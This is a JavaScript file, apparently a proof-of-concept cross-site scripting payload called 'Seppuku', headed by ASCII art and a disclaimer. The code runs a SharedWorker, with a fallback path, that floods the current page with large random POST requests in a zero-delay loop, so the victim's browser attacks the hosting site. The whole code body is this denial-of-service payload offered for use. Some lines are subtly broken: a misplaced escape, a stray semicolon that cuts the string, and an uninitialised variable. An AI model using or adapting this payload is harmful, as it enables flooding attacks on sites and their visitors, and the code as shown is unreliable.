/*

                                        `        ` ````                         
                            `````...`...-..`:.----``.````                       
                     ```.`-..``...-...-..--:--///:--:--::-`                     
                 ``.---::-:--`..`.`````.`.`.`..----:---:-///:.                  
              .:...---::---..``. ````` ` . ```.....-....-.-.-..:-`              
           `--//-:......-...```` ```          ``` ```` ```.`.`--.--.            
         ..`.---.....``.`` ` ``              ` ` `` ```   ````.:--`...          
       .//-:-`..-..-. ```      `            `    ` ` ```  ` ``..`-.-.`--        
     `:/+//-`..::-`.`          `                       ```    ````.--``-/`      
    .hs//:-.--.....``      ```                          ````     ````..``:`     
   -yho//.-/:--..`````  `  ``               `               `     `...:--.:`    
  -mds+:-.--::-``````   `                     ````          `       `.-:-.`/`   
 `dmdy/::-..---..``                                      `     `     `.--:`.-`  
 ohyh/-----::.-.`                                    ``               ``.-.``-  
.myd+:-:-::/..`` `                                     `               ``.`-..  
omdN/:o+-:::--``       `                                               `.-`.-.` 
hNNh:sho/+/+/:``     `                        `                       ``....::..
mNmNooys://://...  `                          `                         `..`./-+
mNmso/o/:://+:...`         `    ``    ``           `                    ``.`--+s
NMNdy//:--+:://.-``          `   `` . ````                             ```.`.:/h
NMNMdys:-.://++::.`.`              `````.`                        ` ``.```..-/+h
dMMMmsy/-.-///o:/.-..``          ` ```  .    `                     ` ...`.--::sy
yMMMNhy+-/----/.....``` `           ` ``.`                      ` ```````::-.++y
-NMMMMNds+/:o+/o-:--.``...``` ` ``````..--``  `            `` ``.`````..:+o//yo+
 sMMNMMMdss:-:++-:--....-....``...```.-:-..`` `  `     ``` `` ..-`. `..-/hsoosy-
 `dMMMMMMNmyso+//::+:-.-:..-..`.`.-.`./-.-......``    ``````` `...``--/sshmmhhs 
  -dMMMMMMMMNmmdyy+yyhs//:-:.-..`--..----.----.....`..````.````--.---/sdNNNNNd. 
   -mMMMMMMNNNNNmdmmmNNmhyo+o+/-..-.:--..-::/-..:---.--.:-:--.:--:+syddNNmmmNo  
    -hdNmdhhyyyhyyyyhydmmmmdddy/.---:::..-:o+:+:::/o++ysmhhhsshhdmmNNNNMNNNNy`  
     +ymMMMMMMMMMMMNNNmmmdhhdmmmss+/:o/::/osyhdyydmmdhhhmhddhddNmmmMNNmNddm/`   
     `++mMMMMNMMMMMMMNmMMMMNdyyNdhh+++++o+hshmNNdhyhhhdNMMMMMMMMMMMMMMMMNd:     
      `/smMMMMMMMMMMMd++yMMMMMmddhs+o+++/ooydNdyhmMMMMMNdyNMMMMMMMMMMMMNd-      
       /ohsmMMMNMMMMNMNh:mMMMNNMmo/://::-::+myyNMMMMMd+/odMMMMMMMMMMMmoy.       
       -yhdshNMMMMMMNNMMNNNMNMMNNs+-----...-osNMMMMNNsomMMMMMMMMMMMms/+.        
        oy+yhoymMMMMMMMMMMNNMMMNm:-.---`-```:dMMMMMMMMMMMMMMMMMMNds+oo+         
        .d+:ohooohmNMMMMMMNNMMMNs.`.--...-` `yNMMMMMMMMMMMMMMNdyosso.s.         
         :h/`.-/+ysoosyhhddmmhs:`..---...-`.`.:yNMMMMMMMNNNdoooyo/..//          
         `/ds:. `-.:/::::--.````.---....`--:.-`.:+osyhysssoos++:``.//           
          `.yy/.``    `` ........--.--...--:.--...`--:-:::..```..-+:            
            `sds/:.`   ```..-.-.....---...-::.-....`````  ```.:+s+.             
              .syys:-. ```.....`..::--..`.-:o/.``.`````.`.-:sohy-`              
                .+sy//..``.`.`.`.`-:oy/`./y+--.`````..-::+yhmh/.                
                  .oy/:..```` ``........`.```.`````.--/oydds/`                  
                    -hy:-...`````.`.`.```  `..`...-/+yhmms-`                    
                     `/y+-.-..`....:::-:----///::/ssyddh/`                      
  `                    `oo--..````.````..```-/--/ohhhh:.   ` `.` ```            
   `                     -++--````..`. `.`.`.--:/ymd+`     .-`....              
    `                      .yy/-``.`````  ```../hNm/        .``.                
                           /NMNmho:-```````.:sddmmmy                            
                          `ymNNNMNmmdhyhhhmNNmmmmmoy.                           
                          ``.-/:+++++ooossoo+:---:.`` 

--------------------------------------------------------------------------------

Seppuku...

--------------------------------------------------------------------------------

I hope your XSS is in order...

It is the user's responsibility to use this script wisely;
 The author takes ZERO responsibility for a user's use of
 this code for malicious or unlawful purposes. This is just
 a proof of concept.
Don't break any laws; test on yourself and/or consenting
 party(s) only.

Love,
pareidolia
*/

var path = window.location.pathname;
var page = path.split("/").pop();
var datalength = 10000;

var background =
"onconnect = function(e){\n"
+"  var x;\n"
+"  if(window.XMLHttpRequest)\n"
+"    x = new XMLHttpRequest();\n"
+"  else\n"
+"    x = new ActiveXObject(\"Microsoft.XMLHTTP\");\n"
+"  var charset = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\";\n"
+"  var data;\n"
+"  while(data.length < "+datalength+")\n"
+"    data+=charset[Math.floor(Math.random()*62)];\n"
+"  x.onreadystatechange = function(){\n"
+"    if(this.readyState == 4 && this.status == 200){\n"
+"      x.open(\"POST\", \""+page+"\", true);\n"
+"      x.send(\"?var=\"+data);\n"
+"     }\n"
+"  };\n"
+"  x.open("\POST\", \""+page+"\", true);\n";
+"  x.send(\"?var=\"+data);\n"
+"  setInterval(function(){\n"
+"    x.send(\"?q=\"+data);\n"
+"  },\n"
+"  0);\n"
+"}\n";

var w;
var blob;
window.URL = window.URL || window.webkitURL;
try
{
  blob = new Blob([background], {type: 'application/javascript'});
}
catch(e)
{
  window.BlobBuilder = window.BlobBuilder ||
		       window.WebKitBlobBuilder ||
		       window.MozBlobBuilder;
  blob = new BlobBuilder();
  blob.append(background);
  blob = blob.getBlob();
}

if(typeof(SharedWorker) !== "undefined")
{
  w = new SharedWorker(URL.createObjectURL(blob));
  w.port.start();
  w.port.postMessage("");
}
else
{
  var x;
  if(window.XMLHttpRequest)
    x = new XMLHttpRequest();
  else
    x = new ActiveXObject("Microsoft.XMLHTTP");
  var charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  var data;
  while(data.length < datalength)
    data+=charset[Math.floor(Math.random()*62)];
  x.open("POST", page, true);
  setInterval(function(){x.send("q="+data);}, 0);
}
